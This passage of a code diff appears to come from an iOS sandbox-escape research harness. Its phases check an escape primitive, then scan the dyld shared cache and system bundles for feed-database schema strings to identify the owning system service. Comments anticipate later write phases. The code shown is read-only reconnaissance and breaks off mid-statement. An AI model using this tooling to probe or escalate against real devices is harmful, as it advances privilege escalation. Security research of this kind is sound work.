+//
+// bq11–bq13 closed three routes: daemon binaries in /usr/libexec are
+// sandbox-unreadable AND the escape refuses that root (handle -3); file
+// scans of frameworks miss them (binaries are in the cache, ENOENT on
+// disk); fork() for crash isolation is EPERM (errno 1, 315/315). What
+// remains is the cache file ITSELF: /System/Library/Caches/com.apple.dyld
+// holds every linked system image — including the /usr/libexec daemons we
+// cannot open — as raw bytes on a world-readable path. Scanning it for
+// the feed schema strings (feedEntries / feedMetadata / functions.list)
+// and attributing each hit to an image via the cache's images table is
+// the same §177 method (strings -> owner) applied where the bytes are
+// actually reachable.
+//
+// READ-ONLY: mmap the cache, parse the public dyld_cache_header layout
+// (magic/mappingOffset/mappingCount at fixed offsets, images table found
+// by validated header scan — every candidate triple is cross-checked
+// against mapping bounds and readable path strings before use), memmem
+// for needles, attribute hits to image paths. A hit names the daemon;
+// no hit after a validated table parse means the schema lives outside
+// the cache (or in our app's own blind spot) — which is also an answer.
+// ---------------------------------------------------------------------------
+
+// Public dyld cache structures (dyld_cache_format.h), declared locally —
+// the SDK does not ship that header.
+struct bq14_cache_header {
+    char     magic[16];
+    uint32_t mappingOffset;
+    uint32_t mappingCount;
+};
+struct bq14_mapping_info {
+    uint64_t address;
+    uint64_t size;
+    uint64_t fileOffset;
+    uint32_t maxProt;
+    uint32_t initProt;
+};
+struct bq14_image_info {
+    uint64_t address;
+    uint64_t modTime;
+    uint64_t pathFileOffset;
+    uint32_t pad;
+};
+
+static BOOL bq14_path_at(int fd, uint64_t off, uint64_t fsize, char *out,
+                         size_t outsz) {
+    if (off == 0 || off >= fsize) return NO;
+    if (pread(fd, out, outsz - 1, (off_t)off) <= 0) return NO;
+    out[outsz - 1] = 0;
+    if (out[0] != '/') return NO;
+    for (size_t i = 0; i < outsz - 1 && out[i]; i++)
+        if (out[i] < 0x20 || out[i] > 0x7e) { out[i] = 0; break; }
+    return out[0] == '/';
+}
+
+static void p_bq14(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    const uint64_t F_DEF = 0x0000008000000000ULL;
+    LOG("[bq14] v176 feed-DB owner via dyld shared cache scan");
+
+    // Control: the §170 point must answer before anything else — the
+    // cache hunt below does not need the escape (its path is under
+    // /System), but a phase without a control hides a dead detector.
+    int64_t h = bq_custom("/var/containers/Data/System", 0, grp, 7, F_DEF, 3);
+    LOG("[bq14] CONTROL §170 point -> handle %lld%s", (long long)h,
+        h < 0 ? "  *** NO ESCAPE — probe broken, aborting ***" : "");
+    fsync(fileno(stderr));
+    if (h < 0) { LOG("[bq14] done"); return; }
+
+    // 1. Locate the cache file. Directory listing first: which of the
+    //    candidate names exists and how big it is (size distinguishes
+    //    the real cache from stubs).
+    const char *cdir = "/System/Library/Caches/com.apple.dyld";
+    DIR *d = opendir(cdir);
+    char cpath[1024] = {0};
+    uint64_t cbest = 0;
+    if (d) {
+        struct dirent *e;
+        while ((e = readdir(d))) {
+            if (e->d_name[0] == '.') continue;
+            char p[1200];
+            snprintf(p, sizeof(p), "%s/%s", cdir, e->d_name);
+            struct stat st;
+            if (stat(p, &st) == 0 && S_ISREG(st.st_mode)) {
+                LOG("[bq14]   %s: %lld bytes", e->d_name, (long long)st.st_size);
+                if ((uint64_t)st.st_size > cbest) {
+                    cbest = (uint64_t)st.st_size;
+                    snprintf(cpath, sizeof(cpath), "%s", p);
+                }
+            }
+        }
+        closedir(d);
+    } else {
+        LOG("[bq14] opendir %s: errno %d", cdir, errno);
+    }
+    if (!cpath[0]) {
+        // Fallback names from other iOS versions / layouts, tried directly
+        // (the com.apple.dyld dir vanished errno 2 on 27.0b4 — the cache
+        // moved with Cryptexes and dyld's own dir).
+        const char *fb[] = {
+            "/System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64e",
+            "/System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64",
+            "/System/Library/dyld/dyld_shared_cache_arm64e",
+            "/System/Library/dyld/dyld_shared_cache_arm64",
+            "/private/var/db/dyld/dyld_shared_cache_arm64e",
+            "/private/preboot/Cryptexes/OS/System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64e",
+            "/private/preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e",
+        };
+        for (unsigned i = 0; i < sizeof(fb)/sizeof(fb[0]); i++) {
+            struct stat st;
+            if (stat(fb[i], &st) == 0 && (uint64_t)st.st_size > cbest) {
+                snprintf(cpath, sizeof(cpath), "%s", fb[i]);
+                cbest = (uint64_t)st.st_size;
+            }
+        }
+        // Directory probes: log which candidate dirs even exist, so a
+        // "no cache reachable" conclusion covers all known layouts rather
+        // than one guessed path.
+        const char *probe[] = {
+            "/System/Library/dyld", "/private/var/db/dyld",
+            "/System/Library/Caches", "/private/preboot/Cryptexes/OS/System/Library/dyld",
+        };
+        for (unsigned i = 0; i < sizeof(probe)/sizeof(probe[0]); i++) {
+            DIR *pd = opendir(probe[i]);
+            if (!pd) { LOG("[bq14] probe %s: errno %d", probe[i], errno); continue; }
+            LOG("[bq14] probe %s: readable", probe[i]);
+            struct dirent *pe;
+            while ((pe = readdir(pd)))
+                if (pe->d_name[0] != '.')
+                    LOG("[bq14]   entry %s", pe->d_name);
+            closedir(pd);
+        }
+        fsync(fileno(stderr));
+    }
+    if (!cpath[0]) {
+        LOG("[bq14] no dyld cache file reachable — route closed");
+        bad_query_release(h); LOG("[bq14] done"); return;
+    }
+    // A 768 KB "cache" is a stub: on 27.0b4 the cache is SPLIT into ~80
+    // sub-cache files (dyld_shared_cache_arm64e.NN) plus a .symbols blob.
+    // Collect every sub-cache (excluding .symbols — it holds debug symbol
+    // names, not __cstring literals) and remember the head file.
+    NSMutableArray *subfiles = [NSMutableArray array];
+    NSString *headFile = nil;
+    {
+        char dirbuf[1100];
+        snprintf(dirbuf, sizeof(dirbuf), "%s", cpath);
+        char *sl = strrchr(dirbuf, '/');
+        if (sl) *sl = 0;
+        DIR *cd = opendir(dirbuf);
+        struct dirent *ce;
+        while (cd && (ce = readdir(cd))) {
+            if (ce->d_name[0] == '.') continue;
+            if (strstr(ce->d_name, ".symbols")) continue;
+            if (!strstr(ce->d_name, "dyld_shared_cache")) continue;
+            char p[1400];
+            snprintf(p, sizeof(p), "%s/%s", dirbuf, ce->d_name);
+            struct stat st;
+            if (stat(p, &st) == 0 && S_ISREG(st.st_mode)) {
+                [subfiles addObject:[NSString stringWithUTF8String:p]];
+                if (!strstr(ce->d_name, "."))
+                    headFile = [NSString stringWithUTF8String:p];
+            }
+        }
+        if (cd) closedir(cd);
+        // List with sizes for the record.
+        for (NSString *f in subfiles) {
+            struct stat st;
+            if (stat(f.fileSystemRepresentation, &st) == 0)
+                LOG("[bq14]   sub %s: %lld bytes",
+                    f.lastPathComponent.UTF8String, (long long)st.st_size);
+        }
+        fsync(fileno(stderr));
+    }
+    if (subfiles.count == 0) {
+        LOG("[bq14] no cache sub-files found — route closed");
+        bad_query_release(h); LOG("[bq14] done"); return;
+    }
+    if (!headFile) headFile = subfiles[0];
+    LOG("[bq14] head: %s, sub-files: %d", headFile.lastPathComponent.UTF8String,
+        (int)subfiles.count);
+    fsync(fileno(stderr));
+
+    // --- HEAD FILE: images table (paths + image addresses live here).
+    int fd = open(headFile.fileSystemRepresentation, O_RDONLY);
+    if (fd < 0) {
+        LOG("[bq14] head open errno %d — route closed", errno);
+        bad_query_release(h); LOG("[bq14] done"); return;
+    }
+    struct stat cst;
+    fstat(fd, &cst);
+    uint64_t fsize = (uint64_t)cst.st_size;
+    void *map = mmap(NULL, (size_t)fsize, PROT_READ, MAP_FILE | MAP_PRIVATE,
+                     fd, 0);
+    if (map == MAP_FAILED) {
+        LOG("[bq14] head mmap errno %d — route closed", errno);
+        close(fd);
+        bad_query_release(h); LOG("[bq14] done"); return;
+    }
+    struct bq14_cache_header *hdr = (struct bq14_cache_header *)map;
+    if (memcmp(hdr->magic, "dyld_v1", 7) != 0) {
+        LOG("[bq14] head bad magic \"%.16s\" — route closed", hdr->magic);
+        munmap(map, (size_t)fsize); close(fd);
+        bad_query_release(h); LOG("[bq14] done"); return;
+    }
+    LOG("[bq14] head magic ok, mappingOffset=%u mappingCount=%u (%llu bytes)",
+        hdr->mappingOffset, hdr->mappingCount,
+        (unsigned long long)fsize);
+    fsync(fileno(stderr));
+
+    // Images table: validated scan of header u32 pairs. In the SPLIT
+    // cache the head's mappings cover only the head file, so image
+    // addresses are NOT inside them — validation is path-based only:
+    // first/middle/last entries must resolve to '/'-paths inside this
+    // file. Count/range sanity checked as well. A table failing any
+    // probe is never used (§144: an unvalidated table is not an oracle).
+    // The header spans [0, mappingOffset=0x238); a first version capped
+    // the candidate scan at 0x17C (ncand budget) and thus never even
+    // tried the fields near the end — all 77 candidates were guesses at
+    // the wrong offsets. Scan the WHOLE header, every u32 pair, both
+    // strides, plus the documented imagesText pair (u64 at 0x88/0x90,
+    // 24-byte {address, size, pathFileOffset} entries — its path field
+    // sits at the same byte offset as dyld_cache_image_info's, so the
+    // same probe applies).
+    uint32_t imgOff = 0, imgCnt = 0, imgStride = 32, imgSlot = 2,
+             imgAddrSlot = 0;
+    BOOL foundTable = NO;
+    const uint32_t MAXC = 600;
+    struct { uint32_t off, cnt, stride; } *cands =
+        (struct { uint32_t off, cnt, stride; } *)malloc(sizeof(*cands) * MAXC);
+    int ncand = 0;
+    uint32_t hdrEnd = hdr->mappingOffset;
+    if (hdrEnd > fsize) hdrEnd = (uint32_t)fsize;
+    for (uint32_t o4 = 0x18; o4 + 8 <= hdrEnd && ncand + 2 <= MAXC; o4 += 4) {
+        uint32_t o = ((uint32_t *)((char *)hdr + o4))[0];
+        uint32_t c = ((uint32_t *)((char *)hdr + o4))[1];
+        cands[ncand].off = o; cands[ncand].cnt = c;
+        cands[ncand].stride = 32; ncand++;
+        cands[ncand].off = o; cands[ncand].cnt = c;
+        cands[ncand].stride = 28; ncand++;
+    }
+    uint64_t tOff = ((uint64_t *)((char *)hdr + 0x88))[0];
+    uint64_t tCnt = ((uint64_t *)((char *)hdr + 0x90))[0];
+    LOG("[bq14] imagesText pair @0x88: offset=0x%llx count=%llu",
+        (unsigned long long)tOff, (unsigned long long)tCnt);
+    if (tOff && tCnt < 40000 && tOff < fsize && ncand < MAXC) {
+        cands[ncand].off = (uint32_t)tOff; cands[ncand].cnt = (uint32_t)tCnt;
+        cands[ncand].stride = 24; ncand++;
+    }
+    int inRange = 0;
+    for (int ci = 0; ci < ncand && !foundTable; ci++) {
+        uint32_t o = cands[ci].off, c = cands[ci].cnt, st = cands[ci].stride;
+        if (c < 100 || c > 40000) continue;
+        if (o == 0 || (uint64_t)o + (uint64_t)c * st > fsize) continue;
+        inRange++;
+        // Layout brute force: raw fields show the path is NOT the 3rd
+        // u64 (0x2a8 entry0 has path=0x0; the 0x2c9e8 table's 3rd u64
+        // equals image0's ADDRESS — Apple reshuffled dyld_cache_image_info
+        // on this build). Try strides {24,28,32,40} × u64 slot {0..4} for
+        // the path field; a layout is accepted only if first/middle/last
+        // entries all resolve to '/'-paths — three probes, no exceptions.
+        BOOL ok = NO;
+        static const uint32_t stridesTry[] = { 24, 28, 32, 40 };
+        for (unsigned si = 0; si < 4 && !ok; si++) {
+            uint32_t st2 = stridesTry[si];
+            if ((uint64_t)o + (uint64_t)c * st2 > fsize) continue;
+            for (uint32_t slot = 0; slot <= 4 && !ok; slot++) {
+                if (slot * 8 + 8 > st2) break;
+                BOOL probesOk = YES;
+                for (int probe = 0; probe < 3 && probesOk; probe++) {
+                    uint32_t idx = probe == 0 ? 0
+                        : (probe == 1 ? c / 2 : c - 1);
+                    uint64_t rawe[6] = {0,0,0,0,0,0};
+                    memcpy(rawe, (char *)map + o +
+                           (uint64_t)idx * st2, st2 < 48 ? st2 : 48);
+                    char pth[256];
+                    if (!bq14_path_at(fd, rawe[slot], fsize, pth,
+                                      sizeof(pth))) probesOk = NO;
+                }
+                if (probesOk) {
+                    // The address slot is not assumed either: pick the
+                    // u64 slot (≠ path slot) that looks like an in-cache
+                    // image address (0x1GB..512GB window, where arm64e
+                    // shared-cache images live) in ALL three probes.
+                    int addrSlot = -1;
+                    for (uint32_t s = 0; s <= 4 && addrSlot < 0; s++) {
+                        if (s == slot || s * 8 + 8 > st2) continue;
+                        BOOL allAddr = YES;
+                        for (int probe = 0; probe < 3 && allAddr; probe++) {
+                            uint32_t idx = probe == 0 ? 0
+                                : (probe == 1 ? c / 2 : c - 1);
+                            uint64_t rawe[6] = {0,0,0,0,0,0};
+                            memcpy(rawe, (char *)map + o +
+                                   (uint64_t)idx * st2,
+                                   st2 < 48 ? st2 : 48);
+                            if (rawe[s] < 0x100000000ULL ||
+                                rawe[s] > 0x8000000000ULL) allAddr = NO;
+                        }
+                        if (allAddr) addrSlot = (int)s;
+                    }
+                    if (addrSlot < 0) continue; // address unusable
+                    ok = YES;
+                    imgOff = o; imgCnt = c; imgStride = st2;
+                    imgSlot = slot;
+                    imgAddrSlot = (uint32_t)addrSlot;
+                    foundTable = YES;
+                    LOG("[bq14]   VALID layout: off=0x%x cnt=%u stride=%u "
+                        "pathSlot=%u addrSlot=%u", o, c, st2, slot,
+                        (uint32_t)addrSlot);
+                }
+            }
+        }
+        if (!ok && inRange <= 20) {
+            uint64_t raw[6] = {0,0,0,0,0,0};
+            memcpy(raw, (char *)map + o, 48);
+            LOG("[bq14]   cand off=0x%x cnt=%u -> fail; entry0 = "
+                "0x%llx 0x%llx 0x%llx 0x%llx 0x%llx 0x%llx",
+                o, c, (unsigned long long)raw[0], (unsigned long long)raw[1],
+                (unsigned long long)raw[2], (unsigned long long)raw[3],
+                (unsigned long long)raw[4], (unsigned long long)raw[5]);
+        }
+    }
+    free(cands);
+    if (!foundTable) {
+        LOG("[bq14] images table not validated: %d/%d candidates in range "
+            "— route closed (no blind attribution)", inRange, ncand);
+        fsync(fileno(stderr));
+        munmap(map, (size_t)fsize); close(fd);
+        bad_query_release(h); LOG("[bq14] done"); return;
+    }
+    LOG("[bq14] images table: offset=0x%x count=%u stride=%u pathSlot=%u "
+        "addrSlot=%u (validated)", imgOff, imgCnt, imgStride, imgSlot,
+        imgAddrSlot);
+    fsync(fileno(stderr));
+
+    // Attribution helper (uses the head mapping only): address -> path.
+    char pth[300];
+    // --- SUB-FILE SCAN: each sub-cache carries its own mappings; a hit's
+    // file offset translates to an in-cache address through THEM, then
+    // to an image path through the head's table.
+    const char *needles[] = { "feedEntries", "feedMetadata",
+                              "lnValue", "feedId",
+                              "LiveEntityService" };
+    const unsigned nneedles = 5;
+    int totalHits = 0;
+    // Distinct attributed images per needle: the DB schema's real owner
+    // must USE these column names in code, so the image set matters more
+    // than individual bytes (raw hits repeat inside one image).
+    NSMutableSet *seenImages[8]; // ≥ nneedles
+    for (unsigned n = 0; n < nneedles; n++)
+        seenImages[n] = [NSMutableSet set];
+
+    for (NSString *sf in subfiles) {
+        int sfd = open(sf.fileSystemRepresentation, O_RDONLY);
+        if (sfd < 0) continue;
+        struct stat sst;
+        fstat(sfd, &sst);
+        uint64_t ssz = (uint64_t)sst.st_size;
+        void *smap = mmap(NULL, (size_t)ssz, PROT_READ,
+                          MAP_FILE | MAP_PRIVATE, sfd, 0);
+        if (smap == MAP_FAILED) { close(sfd); continue; }
+        struct bq14_cache_header *shdr = (struct bq14_cache_header *)smap;
+        if (memcmp(shdr->magic, "dyld_v1", 7) != 0 ||
+            shdr->mappingCount > 64 ||
+            (uint64_t)shdr->mappingOffset + (uint64_t)shdr->mappingCount *
+                sizeof(struct bq14_mapping_info) > ssz) {
+            munmap(smap, (size_t)ssz); close(sfd);
+            continue;
+        }
+        struct bq14_mapping_info *smaps =
+            (struct bq14_mapping_info *)((char *)smap + shdr->mappingOffset);
+
+        for (unsigned n = 0; n < nneedles; n++) {
+            const char *nd = needles[n];
+            size_t nl = strlen(nd);
+            const unsigned char *p = (const unsigned char *)smap;
+            size_t remaining = (size_t)ssz;
+            int hitsThis = 0;
+            const unsigned char *found;
+            while (hitsThis < 32 &&
+                   (found = memmem(p, remaining, nd, nl)) != NULL) {
+                uint64_t foff = (uint64_t)(found -
+                    (const unsigned char *)smap);
+                uint64_t addr = 0;
+                BOOL translated = NO;
+                for (uint32_t m = 0; m < shdr->mappingCount; m++)
+                    if (foff >= smaps[m].fileOffset &&
+                        foff < smaps[m].fileOffset + smaps[m].size) {
+                        addr = smaps[m].address +
+                            (foff - smaps[m].fileOffset);
+                        translated = YES;
+                    }
+                if (translated) {
+                    uint64_t bestA = 0;
+                    uint64_t bestPath = 0;
+                    for (uint32_t i = 0; i < imgCnt; i++) {
+                        uint64_t rawe[6] = {0,0,0,0,0,0};
+                        memcpy(rawe, (char *)map + imgOff +
+                               (uint64_t)i * imgStride,
+                               imgStride < 48 ? imgStride : 48);
+                        uint64_t ia = rawe[imgAddrSlot];
+                        if (ia <= addr && ia >= bestA) {
+                            bestA = ia;
+                            bestPath = rawe[imgSlot];
+                        }
+                    }
+                    pth[0] = 0;
+                    bq14_path_at(fd, bestPath, fsize, pth, sizeof(pth));
+                    BOOL isNew = pth[0] &&
+                        ![seenImages[n] containsObject:
+                            [NSString stringWithUTF8String:pth]];
+                    if (isNew) [seenImages[n] addObject:
+                        [NSString stringWithUTF8String:pth]];
+                    // Verbose per-hit lines only for genuinely new
+                    // images; the final per-needle image list is the
+                    // actual deliverable (raw hits repeat in one image).
+                    if (isNew && [seenImages[n] count] <= 25) {
+                        // Context dump around the FIRST hit of each
+                        // needle in each file: a bare byte match cannot
+                        // distinguish a SQL statement from an unrelated
+                        // identifier; the surrounding printable run can.
+                        char ctx[96];
+                        size_t clen = foff + 88 < ssz ? 88 : (size_t)(ssz - foff);
+                        if (foff > 8) { foff -= 8; clen += 8; }
+                        if (foff + clen > ssz) clen = (size_t)(ssz - foff);
+                        memcpy(ctx, (char *)smap + foff, clen);
+                        for (size_t k = 0; k < clen; k++)
+                            if (ctx[k] < 0x20 || ctx[k] > 0x7e) ctx[k] = '.';
+                        ctx[clen] = 0;
+                        LOG("[bq14]   HIT \"%s\" -> %s | ctx: %s", nd,
+                            pth[0] ? pth : "(no path)", ctx);
+                    }
+                }
+                hitsThis++;
+                totalHits++;
+                p = found + nl;
+                remaining = (size_t)((const unsigned char *)smap + ssz - p);
+            }
+        }
+        munmap(smap, (size_t)ssz);
+        close(sfd);
+        fsync(fileno(stderr));
+    }
+    for (unsigned n = 0; n < nneedles; n++) {
+        NSArray *sorted = [[seenImages[n] allObjects]
+            sortedArrayUsingSelector:@selector(compare:)];
+        LOG("[bq14] needle \"%s\": %d distinct images%s", needles[n],
+            (int)sorted.count, sorted.count > 25 ? " (list capped at 25)" : "");
+        for (NSUInteger i = 0; i < sorted.count && i < 25; i++)
+            LOG("[bq14]     %s", [sorted[i] UTF8String]);
+        fsync(fileno(stderr));
+    }
+    LOG("[bq14] total hits: %d", totalHits);
+    fsync(fileno(stderr));
+
+    munmap(map, (size_t)fsize);
+    close(fd);
+    bad_query_release(h);
+    LOG("[bq14] done");
+}
+
+// ---------------------------------------------------------------------------
+// V176 (p_bq15): on-disk bundle scan — where the feed-DB schema lives.
+//
+// bq14 settled the shared cache: of the whole 4690-image cache, the
+// literal "feedEntries" exists exactly ONCE and it is Photos' own phrase
+// ("feedEntries notification has `shouldReload`"), while every
+// "feedMetadata" hit is the ADS subsystem (PromotedContent /
+// AdPlatformsCommon — feedMetadataCategories/feedMetadataChannelId).
+// "lnValue" resolves to LNValue (AppIntents) and "feedId" to assorted
+// feeds — none of them is SQL over OUR tables. Conclusion: the code
+// that created 8EB68272/db (feedEntries/feedMetadata) is NOT linked
+// into the dyld shared cache — it is an on-disk Mach-O: an app, an
+// appex, or a .momd Core Data model inside a bundle. Those files stat
+// and read fine from the sandbox (§171), unlike /usr/libexec (bq11).
+//
+// Method: walk system bundle roots, read only the magic (a 4-byte read
+// per file — asset files are skipped before touching their bytes),
+// memmem the schema needles over Mach-O files and .mom models, and
+// attribute to the file path directly (files, not images: no
+// attribution guesswork like bq14's address walk). READ-ONLY.
+// ---------------------------------------------------------------------------
+
+static BOOL bq15_is_macho_or_model(int fd) {
+    unsigned char mag[4];
+    if (pread(fd, mag, 4, 0) != 4) return NO;
+    // MH_MAGIC_64 (arm64), FAT_MAGIC/FAT_MAGIC_64 (fat), MH_CIGAM swap.
+    return (mag[0] == 0xCF && mag[1] == 0xFA && mag[2] == 0xED && mag[3] == 0xFE) ||
+           (mag[0] == 0xCA && mag[1] == 0xFE && mag[2] == 0xBA && mag[3] == 0xBE) ||
+           (mag[0] == 0xBE && mag[1] == 0xBA && mag[2] == 0xFE && mag[3] == 0xCA) ||
+           (mag[0] == 0xFE && mag[1] == 0xED && mag[2] == 0xFA && mag[3] == 0xCF);
+}
+
+static int bq15_scanned = 0, bq15_denied = 0, bq15_skipped = 0,
+           bq15_hits = 0;
+static NSMutableSet *bq15_hitFiles = nil;
+
+static void bq15_walk(NSString *dir, int depth,
+                      const char **needles, unsigned nneedles) {
+    if (depth > 6) return;
+    static NSSet *skipDirs = nil;
+    static dispatch_once_t once;
+    dispatch_once(&once, ^{
+        skipDirs = [NSSet setWithObjects:@"AssetsV2", @"Caches", @"Logs",
+                    @"Assets", nil];
+    });
+    DIR *d = opendir(dir.fileSystemRepresentation);
+    if (!d) { bq15_denied++; return; }
+    struct dirent *e;
+    while ((e = readdir(d))) {
+        if (e->d_name[0] == '.') continue;
+        NSString *fp = [dir stringByAppendingFormat:@"/%s", e->d_name];
+        struct stat st;
+        if (lstat(fp.fileSystemRepresentation, &st) != 0) continue;
+        if (S_ISDIR(st.st_mode)) {
+            if ([skipDirs containsObject:
+                    [NSString stringWithUTF8String:e->d_name]]) continue;
+            // Core Data models: entity names live inside .momd/.mom —
+            // a table name in a compiled model is exactly the kind of
+            // evidence we want even without Mach-O code.
+            bq15_walk(fp, depth + 1, needles, nneedles);
+        } else if (S_ISREG(st.st_mode)) {
+            if (st.st_size > (256LL << 20)) { bq15_skipped++; continue; }
+            BOOL isModel = [fp hasSuffix:@".mom"] ||
+                [fp rangeOfString:@".momd/"].location != NSNotFound;
+            int fd = open(fp.fileSystemRepresentation, O_RDONLY);
+            if (fd < 0) { bq15_denied++; continue; }
+            if (!isModel && !bq15_is_macho_or_model(fd)) {
+                close(fd); bq15_skipped++; continue;
+            }
+            // Read in whole: files here are ≤256 MB, most are small.
+            void *buf = mmap(NULL, (size_t)st.st_size, PROT_READ,
+                             MAP_FILE | MAP_PRIVATE, fd, 0);
+            if (buf == MAP_FAILED) {
+                // Fallback for the rare huge-but-mappable failure.
+                close(fd); bq15_skipped++; continue;
+            }
+            bq15_scanned++;
+            for (unsigned n = 0; n < nneedles; n++) {
+                if (memmem(buf, (size_t)st.st_size, needles[n],
+                           strlen(needles[n]))) {
+                    NSString *key = [NSString stringWithFormat:@"%@ <- %s",
+                                     fp, needles[n]];
+                    if (![bq15_hitFiles containsObject:key]) {
+                        [bq15_hitFiles addObject:key];
+                        bq15_hits++;
+                        LOG("[bq15]   HIT %s <- \"%s\"", fp.UTF8String,
+                            needles[n]);
+                        fsync(fileno(stderr));
+                    }
+                    break;
+                }
+            }
+            munmap(buf, (size_t)st.st_size);
+            close(fd);
+        }
+        if ((bq15_scanned & 255) == 255) {
+            LOG("[bq15] ... scanned %d (denied %d, skipped %d)",
+                bq15_scanned, bq15_denied, bq15_skipped);
+            fsync(fileno(stderr));
+        }
+    }
+    closedir(d);
+}
+
+static void p_bq15(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    const uint64_t F_DEF = 0x0000008000000000ULL;
+    LOG("[bq15] v176 feed-DB owner: on-disk bundle scan (cache exonerated)");
+
+    // Control: §170 point first — this phase reads /System and
+    // /Applications (no escape needed), so a dead escape would make the
+    // run unfalsifiable: the same handle check every other phase uses.
+    int64_t h = bq_custom("/var/containers/Data/System", 0, grp, 7, F_DEF, 3);
+    LOG("[bq15] CONTROL §170 point -> handle %lld%s", (long long)h,
+        h < 0 ? "  *** NO ESCAPE — aborting ***" : "");
+    fsync(fileno(stderr));
+    if (h < 0) { LOG("[bq15] done"); return; }
+
+    const char *needles[] = { "feedEntries", "feedMetadata",
+                              "lnValue", "feedId" };
+    const unsigned nneedles = 4;
+    bq15_hitFiles = [NSMutableSet set];
+
+    const char *roots[] = { "/Applications", "/System/Applications",
+                            "/System/Library/ExtensionKit",
+                            "/System/Library/CoreServices",
+                            "/System/Library",
+                            // Control root: bq11 proved every file here
+                            // is EPERM from the sandbox. If this run
+                            // shows zero denials, the walker is broken
+                            // and NO positive/negative result below is
+                            // valid (§144).
+                            "/usr/libexec" };
+    for (unsigned r = 0; r < sizeof(roots) / sizeof(roots[0]); r++) {
+        LOG("[bq15] root %s", roots[r]);
+        fsync(fileno(stderr));
+        NSString *rs = [NSString stringWithUTF8String:roots[r]];
+        struct stat st;
+        if (stat(rs.fileSystemRepresentation, &st) != 0) {
+            LOG("[bq15]   stat errno %d (missing)", errno);
+            continue;
+        }
+        int s0 = bq15_scanned, d0 = bq15_denied;
+        bq15_walk(rs, 0, needles, nneedles);
+        LOG("[bq15] root %s: +%d scanned, +%d denied", roots[r],
+            bq15_scanned - s0, bq15_denied - d0);
+        fsync(fileno(stderr));
+    }
+    LOG("[bq15] scanned=%d denied=%d skipped=%d hits=%d",
+        bq15_scanned, bq15_denied, bq15_skipped, bq15_hits);
+    fsync(fileno(stderr));
+
+    bad_query_release(h);
+    LOG("[bq15] done");
+}
+
+// ---------------------------------------------------------------------------
+// V176 (p_bq16): AppIntentsLiveEntityService — the one on-disk binary
+// holding "feedEntries" (bq15). Three questions, all read-only:
+//
+//  1. What KIND of reference is it — raw SQL (CREATE/INSERT/SELECT over
+//     feedEntries) means this binary owns the tables; a Core Data model
+//     or a key-path means a consumer of a schema owned elsewhere.
+//  2. Who IS this service: Info.plist (CFBundleIdentifier, XPCService
+//     name, required MachServices) — the identity that later write
+//     phases have to reason about.
+//  3. How is it launched: label match in /System/Library/LaunchDaemons +
+//     LaunchAgents plists (run-as uid comes from these) — answers
+//     "mobile vs root", which decides how interesting an INPUT hit here
+//     would be (§179 taught that the uid/gid of a file is the only
+//     ownership fact the sandbox hands us for free).
+// ---------------------------------------------------------------------------
+
+static void bq16_ctx(const unsigned char *base, size_t len, size_t off,
+                     const char *needle) {
+    if (off == (size_t)-1) return;
+    size_t from = off > 90 ? off - 90 : 0;
+    size_t clen = off + 130 < len ? 130 : len - off;
+    if (off > 90) clen += 90;
+    char ctx[256];
+    if (clen > sizeof(ctx) - 1) clen = sizeof(ctx) - 1;
+    memcpy(ctx, base + from, clen);
+    for (size_t k = 0; k < clen; k++)
+        if (ctx[k] < 0x20 || ctx[k] > 0x7e) ctx[k] = '.';
+    ctx[clen] = 0;
+    LOG("[bq16]   ctx[%s] @0x%zx: %s", needle, off, ctx);
+}
+
+static void p_bq16(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    const uint64_t F_DEF = 0x0000008000000000ULL;
+    LOG("[bq16] v176 owner candidate: AppIntentsLiveEntityService.xpc");
+
+    int64_t h = bq_custom("/var/containers/Data/System", 0, grp, 7, F_DEF, 3);
+    LOG("[bq16] CONTROL §170 point -> handle %lld%s", (long long)h,
+        h < 0 ? "  *** NO ESCAPE — aborting ***" : "");
+    fsync(fileno(stderr));
+    if (h < 0) { LOG("[bq16] done"); return; }
+
+    NSString *xpcDir = @"/System/Library/PrivateFrameworks/"
+        "AppIntentsLiveEntitySupport.framework/XPCServices/"
+        "AppIntentsLiveEntityService.xpc";
+    NSString *binPath = [xpcDir stringByAppendingPathComponent:
+        @"AppIntentsLiveEntityService"];
+    // Control: the file bq15 reported must open here too — a phase whose
+    // target silently vanished would "find nothing" exactly like a
+    // broken detector (§144).
+    struct stat st;
+    if (stat(binPath.fileSystemRepresentation, &st) != 0) {
+        LOG("[bq16] target stat errno %d — aborting, target gone", errno);
+        bad_query_release(h); LOG("[bq16] done"); return;
+    }
+    LOG("[bq16] target %lld bytes", (long long)st.st_size);
+    fsync(fileno(stderr));
+
+    NSData *dd = [NSData dataWithContentsOfFile:binPath
+        options:NSDataReadingMappedIfSafe error:nil];
+    if (dd.length == 0) {
+        LOG("[bq16] target unreadable — aborting");
+        bad_query_release(h); LOG("[bq16] done"); return;
+    }
+    const unsigned char *b = dd.bytes;
+    size_t len = dd.length;
+
+    // 1. Reference kinds: SQL verbs next to the table names decide
+    //    owner-vs-consumer. Also collect evidence of sqlite itself.
+    const char *needles[] = { "feedEntries", "feedMetadata",
+        "CREATE TABLE", "INSERT OR REPLACE", "INSERT OR IGNORE",
+        "SELECT * FROM", "PRAGMA", "journal_mode", "sqlite3_open",
+        "NSPersistentContainer", "NSManagedObjectModel" };
+    for (unsigned n = 0; n < sizeof(needles) / sizeof(needles[0]); n++) {
+        const unsigned char *p = b, *end = b + len;
+        int shown = 0;
+        while (shown < 6 && p < end) {
+            const unsigned char *f = memmem(p, (size_t)(end - p),
+                needles[n], strlen(needles[n]));
+            if (!f) break;
+            bq16_ctx(b, len, (size_t)(f - b), needles[n]);
+            shown++;
+            p = f + strlen(needles[n]);
+        }
+        if (!shown)
+            LOG("[bq16]   no \"%s\"", needles[n]);
+        fsync(fileno(stderr));
+    }
+
+    // 2. Info.plist of the service.
+    NSString *ipPath = [xpcDir stringByAppendingPathComponent:@"Info.plist"];
+    NSData *ipd = [NSData dataWithContentsOfFile:ipPath];
+    if (ipd) {
+        id pl = [NSPropertyListSerialization propertyListWithData:ipd
+            options:0 format:NULL error:nil];
+        // description, not JSON: plist values can be NSData/NSDate and
+        // NSJSONSerialization would throw on them.
+        LOG("[bq16] Info.plist: %s",
